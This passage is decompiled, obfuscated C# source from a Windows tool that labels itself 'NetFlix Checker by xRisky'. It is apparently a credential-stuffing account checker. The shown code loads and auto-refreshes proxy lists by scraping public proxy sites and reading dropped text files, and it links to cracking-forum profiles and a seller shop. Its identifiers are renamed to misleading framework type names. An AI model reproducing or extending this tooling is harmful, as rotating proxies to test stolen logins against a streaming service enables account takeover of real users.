				this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Enabled = false;
			}
		}

		private void SerializationExceptionWindowsImpersonationContext(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(45);
			if (!this.ResolveEventArgsSHA384.Checked)
			{
				if (!this.ResolveEventArgsSHA384.Checked)
				{
					this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.LeftColor = Color.FromArgb(63, 63, 63);
					this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Enabled = false;
					this.IDescriptionMetadataEntry.Enabled = false;
					this.ISerializable.ForeColor = Color.FromArgb(105, 105, 105);
					this.CompatibilityFlag.ForeColor = Color.FromArgb(200, 200, 200);
				}
			}
			else
			{
				this.ScopeTree.Checked = false;
				this.SoapIntegerInt32.Checked = false;
				this.MarshalByRefObject.Enabled = true;
				this.TOKENPRIVILEGE.Enabled = true;
				this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Enabled = true;
				this.ExceptionInfo.Enabled = false;
				this.AssemblyAlgorithmIdAttribute.Enabled = false;
				this.ISerializable.Enabled = true;
				this.JitHelpers.Checked = false;
				this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Enabled = false;
				this.CompatibilityFlag.Enabled = false;
				this.IDescriptionMetadataEntry.Enabled = false;
				this.ISerializable.ForeColor = Color.FromArgb(200, 200, 200);
				this.CompatibilityFlag.ForeColor = Color.FromArgb(105, 105, 105);
			}
		}

		private void ManualResetEvent(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(46);
			if (this.SoapIntegerInt32.Checked)
			{
				this.ResolveEventArgsSHA384.Checked = false;
				this.ScopeTree.Checked = false;
				this.CompatibilityFlag.ForeColor = Color.FromArgb(105, 105, 105);
				this.CompatibilityFlag.Enabled = false;
				this.NullTextReader.Visible = false;
				this.ConvertUnverifiableCodeAttribute.Visible = true;
				this.ConvertUnverifiableCodeAttribute.Location = new Point(244, 314);
				this.DefaultFilter.Height = 650;
				this.CrossAppDomainSink.Height = 606;
				this.EventItfInfo.Enabled = false;
				this.SafeTokenHandle.Enabled = false;
				this.ISCIIDecoder.Enabled = false;
				this.NullTextReader.Height = 179;
				this.IMembershipConditionDelegateBindingFlags.Location = new Point(488, 470);
				this.SharedStatics.Enabled = false;
				this.JitHelpers.ForeColor = Color.FromArgb(128, 128, 128);
				this.SharedStatics.LeftColor = Color.FromArgb(63, 63, 63);
				this.RuntimeEventInfo.Height = 458;
				base.Height = 688;
			}
			else if (!this.SoapIntegerInt32.Checked)
			{
				this.NullTextReader.Height = 179;
				this.NullTextReader.Location = new Point(245, 314);
				this.CrossAppDomainSink.Height = 487;
				this.TOKENPRIVILEGE.Checked = false;
				base.Height = 560;
				this.DefaultFilter.Height = 530;
				this.IMembershipConditionDelegateBindingFlags.Location = new Point(488, 351);
				this.RuntimeEventInfo.Height = 338;
				this.SoapIntegerInt32.Checked = false;
				this.CompatibilityFlag.ForeColor = Color.FromArgb(200, 200, 200);
				this.NullTextReader.Visible = true;
				this.ConvertUnverifiableCodeAttribute.Visible = false;
			}
		}

		private void DebuggerDisplayAttribute(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(47);
			try
			{
				if (!string.IsNullOrWhiteSpace(this.MarshalByRefObject.Text))
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						httpRequest.UserAgent = Http.ChromeUserAgent();
						Match match = new Regex("[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}:[0-9]{1,5}").Match(httpRequest.Get(this.MarshalByRefObject.Text, null).ToString());
						HMAC.ObjectAuditRule.Clear();
						while (match.Success)
						{
							HMAC.ObjectAuditRule.Add(match.Value);
							match = match.NextMatch();
						}
						this.ISerializable.Text = "Load Proxies ( " + HMAC.ObjectAuditRule.Count.ToString() + " )";
					}
				}
			}
			catch (Exception ex)
			{
				this.ISerializable.Text = "Load Proxies ( Error )";
			}
		}

		private void KeyContainerPermissionAccessEntryEnumerator(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(48);
			try
			{
				if (!string.IsNullOrWhiteSpace(this.MarshalByRefObject.Text))
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						httpRequest.UserAgent = Http.ChromeUserAgent();
						Match match = new Regex("[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}:[0-9]{1,5}").Match(httpRequest.Get(this.MarshalByRefObject.Text, null).ToString());
						HMAC.ObjectAuditRule.Clear();
						while (match.Success)
						{
							HMAC.ObjectAuditRule.Add(match.Value);
							match = match.NextMatch();
						}
						this.ISerializable.Text = "Load Proxies ( " + HMAC.ObjectAuditRule.Count.ToString() + " )";
					}
				}
			}
			catch (Exception ex)
			{
				this.ISerializable.Text = "Load Proxies ( Error )";
			}
		}

		private void InvalidOperationException(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(49);
			if (this.TOKENPRIVILEGE.Checked)
			{
				this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Enabled = true;
				this.AssemblyAttributesGoHere.Enabled = true;
				this.AssemblyAttributesGoHere.Interval = checked(this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Value * 60 * 1000);
			}
			if (!this.TOKENPRIVILEGE.Checked)
			{
				this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Enabled = false;
				this.AssemblyAttributesGoHere.Enabled = false;
			}
		}

		private void SmuggledMethodCallMessage(object sender, DragEventArgs e)
		{
			<Module>.SoapFieldAttribute(50);
			try
			{
				string[] array = (string[])e.Data.GetData(DataFormats.FileDrop, false);
				HMAC.ObjectAuditRule.Clear();
				foreach (string path in array)
				{
					HMAC.AssemblyMetadata.AddRange(File.ReadAllLines(path).Distinct<string>());
				}
				HMAC.ObjectAuditRule.AddRange(HMAC.AssemblyMetadata.Distinct<string>());
				HMAC.AssemblyMetadata.Clear();
				this.CompatibilityFlag.Text = "Proxies ( " + HMAC.ObjectAuditRule.Count.ToString() + " )";
			}
			catch (Exception ex)
			{
			}
		}

		private void MethodSemanticsAttributesFileCodeGroup(object sender, DragEventArgs e)
		{
			<Module>.SoapFieldAttribute(51);
			if (!e.Data.GetDataPresent(DataFormats.Bitmap) || (e.AllowedEffect & DragDropEffects.Copy) <= DragDropEffects.None)
			{
				e.Effect = DragDropEffects.Copy;
			}
			else
			{
				e.Effect = DragDropEffects.All;
			}
		}

		private void ComparisonResult(object sender, EventArgs e)
		{
			this.DebuggerStepperBoundaryAttribute = string.Empty;
		}

		private void WaitHandleCannotBeOpenedException(object sender, DragEventArgs e)
		{
			<Module>.SoapFieldAttribute(52);
			if (Operators.CompareString(this.DebuggerStepperBoundaryAttribute, string.Empty, false) == 0)
			{
				this.DebuggerStepperBoundaryAttribute = string.Empty;
				foreach (string text in e.Data.GetFormats())
				{
					if (Operators.CompareString(text, "FileNameW", false) == 0)
					{
						object objectValue = RuntimeHelpers.GetObjectValue(e.Data.GetData(text));
						if (objectValue is string[])
						{
							this.DebuggerStepperBoundaryAttribute = Conversions.ToString(NewLateBinding.LateIndexGet(objectValue, new object[]
							{
								0
							}, null));
							if (!this.DebuggerStepperBoundaryAttribute.ToLower().EndsWith(".txt"))
							{
								e.Effect = DragDropEffects.None;
								this.DebuggerStepperBoundaryAttribute = string.Empty;
							}
							else
							{
								e.Effect = DragDropEffects.Copy;
							}
						}
						else
						{
							e.Effect = DragDropEffects.None;
						}
					}
				}
			}
		}

		private void RuntimeWrappedException(object sender, EventArgs e)
		{
			Process.Start("https://goo.gl/3DJThv");
		}

		private void FileShare(object sender, EventArgs e)
		{
			Process.Start("https://goo.gl/HcLg56");
		}

		private void TypeKind(object sender, EventArgs e)
		{
			Process.Start("https://shoppy.gg/user/xRisky");
		}

		private void TypeUnloadedException(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(53);
			Interaction.MsgBox("Do not forget to subscribe to the other channel", MsgBoxStyle.Information, null);
			Process.Start("https://goo.gl/u4VrES");
		}

		private void Delegate(object sender, EventArgs e)
		{
			Process.Start("https://www.youtube.com/channel/UCsnpw8YMqjv9tkJSNuEzrfA?view_as=subscriber");
		}

		private void SoapEntity(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(54);
			Process.Start("https://twitter.com/c09e");
		}

		private void ResourceLocation(object sender, EventArgs e)
		{
			Process.Start("https://cracked.to/member.php?action=profile&uid=18273");
		}

		private void ReadObjectInfo(object sender, EventArgs e)
		{
			Process.Start("https://crack.sx/member.php?action=profile&uid=93#comments/1");
		}

		private void NonSerializedAttribute(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(55);
			Process.Start("https://cracked.to/member.php?action=register&referrer=18273");
		}

		private void UnknownWrapper(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(56);
			Process.Start("https://crack.sx/member.php?action=register&referrer=93");
		}

		private void WindowsAccountType(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(57);
			if (Operators.CompareString(this.TOKENGROUPSOverlappedDataCacheLine.Text, "ProxyLess", false) == 0)
			{
				this.CMSHASHDIGESTMETHOD.Visible = false;
				HMAC.ObjectAuditRule.Clear();
				this.CompatibilityFlag.Text = "Proxies";
				this.CompatibilityFlag.Enabled = false;
				this.ScopeTree.Enabled = false;
				this.ResolveEventArgsSHA384.Enabled = false;
				this.ScopeTree.ForeColor = Color.FromArgb(105, 105, 105);
				this.CompatibilityFlag.ForeColor = Color.FromArgb(105, 105, 105);
				this.ResolveEventArgsSHA384.ForeColor = Color.FromArgb(105, 105, 105);
				this.ScopeTree.ForeColor = Color.FromArgb(105, 105, 105);
				this.TOKENPRIVILEGE.ForeColor = Color.FromArgb(105, 105, 105);
				this.ISerializable.ForeColor = Color.FromArgb(105, 105, 105);
			}
			else
			{
				this.ScopeTree.ForeColor = Color.FromArgb(200, 200, 200);
				this.CompatibilityFlag.ForeColor = Color.FromArgb(200, 200, 200);
				this.ResolveEventArgsSHA384.ForeColor = Color.FromArgb(200, 200, 200);
				this.ScopeTree.ForeColor = Color.FromArgb(200, 200, 200);
				this.TOKENPRIVILEGE.ForeColor = Color.FromArgb(200, 200, 200);
				this.ISerializable.ForeColor = Color.FromArgb(200, 200, 200);
				this.CMSHASHDIGESTMETHOD.Visible = true;
				this.CompatibilityFlag.Enabled = true;
				this.ScopeTree.Enabled = true;
				this.ResolveEventArgsSHA384.Enabled = true;
			}
		}

		private unsafe void QualifiedAce(object sender, MetroTrackbar.TrackbarEventArgs e)
		{
			<Module>.SoapFieldAttribute(58);
			byte* ptr = stackalloc byte[(UIntPtr)4];
			int value = this.Context.Value;
			*(int*)ptr = value;
			this.CrossAppDomainChannel.Text = string.Concat(new string[]
			{
				((int*)ptr)->ToString()
			});
		}

		private unsafe void DllImportAttribute(object sender, MetroTrackbar.TrackbarEventArgs e)
		{
			<Module>.SoapFieldAttribute(59);
			byte* ptr = stackalloc byte[(UIntPtr)4];
			int value = this.ThreadStart.Value;
			*(int*)ptr = value;
			this.IEnumSTORECATEGORYSUBCATEGORY.Text = string.Concat(new string[]
			{
				((int*)ptr)->ToString()
			});
		}

		private void CultureTableData(object object_0, bool bool_0)
		{
			<Module>.SoapFieldAttribute(60);
			if (this.TOKENPRIVILEGE.Checked)
			{
				Interaction.MsgBox("Will be Auto update the Proxies every ( " + Conversions.ToString(this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Value) + " Min )\r\n\r\n-\r\nIf you want to change the time \r\nset the time you want\r\nThen click ( ⟳ )", MsgBoxStyle.Information, null);
				this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Enabled = true;
				this.IDescriptionMetadataEntry.Enabled = true;
				this.ExceptionInfo.Enabled = true;
				this.AssemblyAlgorithmIdAttribute.Enabled = true;
				this.TOKENPRIVILEGE.ForeColor = Color.FromArgb(255, 255, 255);
				this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.LeftColor = Color.FromArgb(0, 122, 204);
				this.AssemblyAttributesGoHere.Enabled = true;
				this.AssemblyAttributesGoHere.Interval = checked(this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Value * 60 * 1000);
			}
			else
			{
				this.AssemblyAttributesGoHere.Enabled = false;
				this.ExceptionInfo.Enabled = false;
				this.AssemblyAlgorithmIdAttribute.Enabled = false;
				this.TOKENPRIVILEGE.ForeColor = Color.FromArgb(128, 128, 128);
				this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.LeftColor = Color.FromArgb(63, 63, 63);
				this.IDescriptionMetadataEntry.Enabled = false;
				this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Enabled = false;
			}
		}

		private unsafe void CATEGORYSUBCATEGORY(object sender, MetroTrackbar.TrackbarEventArgs e)
		{
			<Module>.SoapFieldAttribute(61);
			byte* ptr = stackalloc byte[(UIntPtr)4];
			int value = this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Value;
			*(int*)ptr = value;
			this.IDescriptionMetadataEntry.Text = string.Concat(new string[]
			{
				((int*)ptr)->ToString()
			}) + " Min";
		}

		private void IFileEntry(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(62);
			int num = (int)MessageBox.Show("Are you sure to Auto update the Proxies every ( " + Conversions.ToString(this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Value) + " Min )", "NetFlix Checker by xRisky", MessageBoxButtons.YesNo);
			int num2 = num;
			if (num2 != 7 && num2 == 6)
			{
				this.TOKENPRIVILEGE.Checked = false;
				this.TOKENPRIVILEGE.Checked = true;
				Interaction.MsgBox("Done ... \r\nWill be Auto update the Proxies every ( " + Conversions.ToString(this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Value) + " Min )", MsgBoxStyle.Information, null);
			}
		}

		private void ConsoleCancelEventArgs(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(63);
			int num = (int)MessageBox.Show("Are you sure to Auto update the Proxies every ( " + Conversions.ToString(this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Value) + " Min )", "NetFlix Checker by xRisky", MessageBoxButtons.YesNo);
			int num2 = num;
			if (num2 != 7 && num2 == 6)
			{
				this.TOKENPRIVILEGE.Checked = false;
				this.TOKENPRIVILEGE.Checked = true;
				Interaction.MsgBox("Done ... \r\nWill be Auto update the Proxies every ( " + Conversions.ToString(this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Value) + " Min )", MsgBoxStyle.Information, null);
			}
		}

		private void InternalArrayTypeE(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(64);
			this.AssemblyAlgorithmIdAttribute.BackColor = Color.FromArgb(35, 35, 35);
			this.ExceptionInfo.BackColor = Color.FromArgb(35, 35, 35);
		}

		private void UCOMIEnumVARIANT(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(65);
			this.AssemblyAlgorithmIdAttribute.BackColor = Color.FromArgb(35, 35, 35);
			this.ExceptionInfo.BackColor = Color.FromArgb(35, 35, 35);
		}

		private void AppDomain(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(66);
			this.AssemblyAlgorithmIdAttribute.BackColor = Color.FromArgb(60, 60, 60);
			this.ExceptionInfo.BackColor = Color.FromArgb(60, 60, 60);
		}

		private void IMessage(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(67);
			this.AssemblyAlgorithmIdAttribute.BackColor = Color.FromArgb(60, 60, 60);
			this.ExceptionInfo.BackColor = Color.FromArgb(60, 60, 60);
		}

		private void CultureTableRecord(object object_0, bool bool_0)
		{
			<Module>.SoapFieldAttribute(68);
			if (!this.BinaryTypeEnum.Checked)
			{
				if (!this.BinaryTypeEnum.Checked)
				{
					this.BinaryTypeEnum.Checked = false;
				}
			}
			else
			{
				this.InvalidFilterCriteriaExceptionMdaHelper.Checked = false;
				this.FileAttributes.Checked = false;
				this.ThreadPoolGlobals.Checked = false;
				this.RawSecurityDescriptor.Checked = false;
			}
		}

		private void SafeArrayRankMismatchException(object object_0, bool bool_0)
		{
			<Module>.SoapFieldAttribute(69);
			if (this.InvalidFilterCriteriaExceptionMdaHelper.Checked)
			{
				this.BinaryTypeEnum.Checked = false;
				this.FileAttributes.Checked = false;
				this.ThreadPoolGlobals.Checked = false;
				this.RawSecurityDescriptor.Checked = false;
			}
			else if (!this.InvalidFilterCriteriaExceptionMdaHelper.Checked)
			{
				this.InvalidFilterCriteriaExceptionMdaHelper.Checked = false;
			}
		}

		private void AssemblyRegistrationFlags(object object_0, bool bool_0)
		{
			<Module>.SoapFieldAttribute(70);
			if (!this.FileAttributes.Checked)
			{
				if (!this.FileAttributes.Checked)
				{
					this.FileAttributes.Checked = false;
				}
			}
			else
			{
				this.BinaryTypeEnum.Checked = false;
				this.InvalidFilterCriteriaExceptionMdaHelper.Checked = false;
				this.ThreadPoolGlobals.Checked = false;
				this.RawSecurityDescriptor.Checked = false;
			}
		}

		private void CustomAttributeBuilder(object object_0, bool bool_0)
		{
			<Module>.SoapFieldAttribute(71);
			if (this.ThreadPoolGlobals.Checked)
			{
				this.BinaryTypeEnum.Checked = false;
				this.InvalidFilterCriteriaExceptionMdaHelper.Checked = false;
				this.FileAttributes.Checked = false;
				this.RawSecurityDescriptor.Checked = false;
			}
			else if (!this.ThreadPoolGlobals.Checked)
			{
				this.ThreadPoolGlobals.Checked = false;
			}
		}

		private void FixedBufferAttribute(object object_0, bool bool_0)
		{
			<Module>.SoapFieldAttribute(72);
			if (this.RawSecurityDescriptor.Checked)
			{
				this.BinaryTypeEnum.Checked = false;
				this.InvalidFilterCriteriaExceptionMdaHelper.Checked = false;
				this.FileAttributes.Checked = false;
				this.ThreadPoolGlobals.Checked = false;
			}
			else if (!this.RawSecurityDescriptor.Checked)
			{
				this.RawSecurityDescriptor.Checked = false;
			}
		}

		private void DriveInfo(object object_0, bool bool_0)
		{
			<Module>.SoapFieldAttribute(73);
			if (!this.JitHelpers.Checked)
			{
				this.CATEGORYSUBCATEGORYInternalRemotingServices.Enabled = false;
				this.ISecurableChannelAssemblyReferenceDependentAssemblyEntry.Enabled = false;
				this.EventItfInfo.Enabled = false;
				this.SafeTokenHandle.Enabled = false;
				this.JitHelpers.ForeColor = Color.FromArgb(128, 128, 128);
				this.SharedStatics.LeftColor = Color.FromArgb(63, 63, 63);
				this.ISCIIDecoder.Enabled = false;
				this.SharedStatics.Enabled = false;
			}
			else
			{
				this.SharedStatics.Enabled = true;
				Interaction.MsgBox("Will be Auto update the Proxies every ( " + Conversions.ToString(this.SharedStatics.Value) + " Min )\r\n\r\n-\r\nIf you want to change the time \r\nset the time you want\r\nThen click ( ⟳ )", MsgBoxStyle.Information, null);
				this.ISCIIDecoder.Enabled = true;
				this.JitHelpers.ForeColor = Color.FromArgb(255, 255, 255);
				this.SharedStatics.LeftColor = Color.FromArgb(0, 122, 204);
				this.ISecurableChannelAssemblyReferenceDependentAssemblyEntry.Enabled = true;
				this.ISecurableChannelAssemblyReferenceDependentAssemblyEntry.Interval = checked(this.SharedStatics.Value * 60 * 1000);
				this.EventItfInfo.Enabled = true;
				this.SafeTokenHandle.Enabled = true;
			}
		}

		private void ManualResetEventDescriptionMetadataEntry(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(74);
			int num = (int)MessageBox.Show("Are you sure to Auto update the Proxies every ( " + Conversions.ToString(this.SharedStatics.Value) + " Min )", "NetFlix Checker by xRisky", MessageBoxButtons.YesNo);
			int num2 = num;
			if (num2 != 7 && num2 == 6)
			{
				this.JitHelpers.Checked = false;
				this.JitHelpers.Checked = true;
				Interaction.MsgBox("Done ... \r\nWill be Auto update the Proxies every ( " + Conversions.ToString(this.SharedStatics.Value) + " Min )", MsgBoxStyle.Information, null);
			}
		}

		private void ZoneMembershipCondition(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(75);
			int num = (int)MessageBox.Show("Are you sure to Auto update the Proxies every ( " + Conversions.ToString(this.SharedStatics.Value) + " Min )", "NetFlix Checker by xRisky", MessageBoxButtons.YesNo);
			int num2 = num;
			if (num2 != 7 && num2 == 6)
			{
				this.JitHelpers.Checked = false;
				this.JitHelpers.Checked = true;
				Interaction.MsgBox("Done ... \r\nWill be Auto update the Proxies every ( " + Conversions.ToString(this.SharedStatics.Value) + " Min )", MsgBoxStyle.Information, null);
			}
		}

		private void SoapInteger(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(76);
			this.SafeTokenHandle.BackColor = Color.FromArgb(35, 35, 35);
			this.EventItfInfo.BackColor = Color.FromArgb(35, 35, 35);
		}

		private void FastResourceComparer(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(77);
			this.SafeTokenHandle.BackColor = Color.FromArgb(35, 35, 35);
			this.EventItfInfo.BackColor = Color.FromArgb(35, 35, 35);
		}

		private void KeyContainerPermissionAccessEntryCollection(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(78);
			this.SafeTokenHandle.BackColor = Color.FromArgb(60, 60, 60);
			this.EventItfInfo.BackColor = Color.FromArgb(60, 60, 60);
		}

		private void TripleDESCryptoServiceProvider(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(79);
			this.SafeTokenHandle.BackColor = Color.FromArgb(60, 60, 60);
			this.EventItfInfo.BackColor = Color.FromArgb(60, 60, 60);
		}

		private unsafe void Int64(object sender, MetroTrackbar.TrackbarEventArgs e)
		{
			<Module>.SoapFieldAttribute(80);
			byte* ptr = stackalloc byte[(UIntPtr)4];
			int value = this.SharedStatics.Value;
			*(int*)ptr = value;
			this.ISCIIDecoder.Text = string.Concat(new string[]
			{
				((int*)ptr)->ToString()
			}) + " Min";
		}

		private void ObjectCreationDelegate(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(81);
			try
			{
				if (this.ThreadPoolGlobals.Checked)
				{
					HMAC.ObjectAuditRule.Clear();
					using (HttpRequest httpRequest = new HttpRequest())
					{
						string input = httpRequest.Get("https://www.free-proxy-list.net/", null).ToString();
						MatchCollection matchCollection = Regex.Matches(input, "\\d{1,3}[.]\\d{1,3}[.]\\d{1,3}[.]\\d{1,3}</td><td>\\d{1,6}");
						try
						{
							foreach (object obj in matchCollection)
							{
								object objectValue = RuntimeHelpers.GetObjectValue(obj);
								Match match = (Match)objectValue;
								HMAC.ObjectAuditRule.Add(match.Value.Replace("</td><td>", ":") + "\r\n");
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
						this.TypeResolveHandler.Text = " Load Proxies ( " + Conversions.ToString(HMAC.ObjectAuditRule.Count.ToString()) + " )";
					}
				}
				if (this.RawSecurityDescriptor.Checked)
				{
					HMAC.ObjectAuditRule.Clear();
					using (HttpRequest httpRequest2 = new HttpRequest())
					{
						string input2 = httpRequest2.Get("http://fineproxy.org/eng/fresh-proxies/", null).ToString();
						MatchCollection matchCollection2 = Regex.Matches(input2, "\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b:\\d{2,5}");
						try
						{
							foreach (object obj2 in matchCollection2)
							{
								object objectValue2 = RuntimeHelpers.GetObjectValue(obj2);
								Match match2 = (Match)objectValue2;
								HMAC.ObjectAuditRule.Add(match2.Value.Replace("</td><td>", ":") + "\r\n");
							}
						}
						finally
						{
							IEnumerator enumerator2;
							if (enumerator2 is IDisposable)
							{
								(enumerator2 as IDisposable).Dispose();
							}
						}
						this.TypeResolveHandler.Text = " Load Proxies ( " + Conversions.ToString(HMAC.ObjectAuditRule.Count.ToString()) + " )";
					}
				}
				if (this.FileAttributes.Checked)
				{
					HMAC.ObjectAuditRule.Clear();
					using (HttpRequest httpRequest3 = new HttpRequest())
					{
						string input3 = httpRequest3.Get("https://proxyscrape.com/api/?request=displayproxies&proxytype=socks5&timeout=10000&country=all&anonymity=all&ssl=all/", null).ToString();
						MatchCollection matchCollection3 = Regex.Matches(input3, "\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b:\\d{2,5}");
						try
						{
							foreach (object obj3 in matchCollection3)
							{
								object objectValue3 = RuntimeHelpers.GetObjectValue(obj3);
								Match match3 = (Match)objectValue3;
								HMAC.ObjectAuditRule.Add(match3.Value.Replace("</td><td>", ":") + "\r\n");
							}
						}
						finally
						{
							IEnumerator enumerator3;
							if (enumerator3 is IDisposable)
							{
								(enumerator3 as IDisposable).Dispose();
							}
						}
						this.TypeResolveHandler.Text = " Load Proxies ( " + Conversions.ToString(HMAC.ObjectAuditRule.Count.ToString()) + " )";
					}
				}
				if (this.InvalidFilterCriteriaExceptionMdaHelper.Checked)
				{
					HMAC.ObjectAuditRule.Clear();
					using (HttpRequest httpRequest4 = new HttpRequest())
					{
						string input4 = httpRequest4.Get("https://proxyscrape.com/api/?request=displayproxies&proxytype=socks4&timeout=10000&country=all&anonymity=all&ssl=all/", null).ToString();
						MatchCollection matchCollection4 = Regex.Matches(input4, "\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b:\\d{2,5}");
						try
						{
							foreach (object obj4 in matchCollection4)
							{
								object objectValue4 = RuntimeHelpers.GetObjectValue(obj4);
								Match match4 = (Match)objectValue4;
								HMAC.ObjectAuditRule.Add(match4.Value.Replace("</td><td>", ":") + "\r\n");
							}
						}
						finally
						{
							IEnumerator enumerator4;
							if (enumerator4 is IDisposable)
							{
								(enumerator4 as IDisposable).Dispose();
							}
						}
						this.TypeResolveHandler.Text = " Load Proxies ( " + Conversions.ToString(HMAC.ObjectAuditRule.Count.ToString()) + " )";
					}
				}
				if (this.BinaryTypeEnum.Checked)
				{
					HMAC.ObjectAuditRule.Clear();
					using (HttpRequest httpRequest5 = new HttpRequest())
					{
						string input5 = httpRequest5.Get("https://proxyscrape.com/api/?request=displayproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all", null).ToString();
						MatchCollection matchCollection5 = Regex.Matches(input5, "\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b:\\d{2,5}");
						try
						{
							foreach (object obj5 in matchCollection5)
							{
								object objectValue5 = RuntimeHelpers.GetObjectValue(obj5);
								Match match5 = (Match)objectValue5;
								HMAC.ObjectAuditRule.Add(match5.Value.Replace("</td><td>", ":") + "\r\n");
							}
						}
						finally
						{
							IEnumerator enumerator5;
							if (enumerator5 is IDisposable)
							{
								(enumerator5 as IDisposable).Dispose();
							}
						}
						this.TypeResolveHandler.Text = " Load Proxies ( " + Conversions.ToString(HMAC.ObjectAuditRule.Count.ToString()) + " )";
					}
				}
			}
			catch (Exception ex)
			{
				this.TypeResolveHandler.Text = "Load Proxies ( Error )";
			}
		}

		private void RankException(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(82);
			try
			{
				if (this.ThreadPoolGlobals.Checked)
				{
					HMAC.ObjectAuditRule.Clear();
					using (HttpRequest httpRequest = new HttpRequest())
					{
						string input = httpRequest.Get("https://www.free-proxy-list.net/", null).ToString();
						MatchCollection matchCollection = Regex.Matches(input, "\\d{1,3}[.]\\d{1,3}[.]\\d{1,3}[.]\\d{1,3}</td><td>\\d{1,6}");
						try
						{
							foreach (object obj in matchCollection)
							{
								object objectValue = RuntimeHelpers.GetObjectValue(obj);
								Match match = (Match)objectValue;
								HMAC.ObjectAuditRule.Add(match.Value.Replace("</td><td>", ":") + "\r\n");
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
						this.TypeResolveHandler.Text = " Load Proxies ( " + Conversions.ToString(HMAC.ObjectAuditRule.Count.ToString()) + " )";
					}
				}
				if (this.RawSecurityDescriptor.Checked)
				{
					HMAC.ObjectAuditRule.Clear();
					using (HttpRequest httpRequest2 = new HttpRequest())
					{
						string input2 = httpRequest2.Get("http://fineproxy.org/eng/fresh-proxies/", null).ToString();
						MatchCollection matchCollection2 = Regex.Matches(input2, "\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b:\\d{2,5}");
						try
						{
							foreach (object obj2 in matchCollection2)
							{
								object objectValue2 = RuntimeHelpers.GetObjectValue(obj2);
								Match match2 = (Match)objectValue2;
								HMAC.ObjectAuditRule.Add(match2.Value.Replace("</td><td>", ":") + "\r\n");
							}
						}
						finally
						{
							IEnumerator enumerator2;
							if (enumerator2 is IDisposable)
							{
								(enumerator2 as IDisposable).Dispose();
							}
						}
						this.TypeResolveHandler.Text = " Load Proxies ( " + Conversions.ToString(HMAC.ObjectAuditRule.Count.ToString()) + " )";
					}
				}
				if (this.FileAttributes.Checked)
				{
					HMAC.ObjectAuditRule.Clear();
					using (HttpRequest httpRequest3 = new HttpRequest())
					{
						string input3 = httpRequest3.Get("https://proxyscrape.com/api/?request=displayproxies&proxytype=socks5&timeout=10000&country=all&anonymity=all&ssl=all/", null).ToString();
						MatchCollection matchCollection3 = Regex.Matches(input3, "\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b:\\d{2,5}");
						try
						{
							foreach (object obj3 in matchCollection3)
							{
								object objectValue3 = RuntimeHelpers.GetObjectValue(obj3);
								Match match3 = (Match)objectValue3;
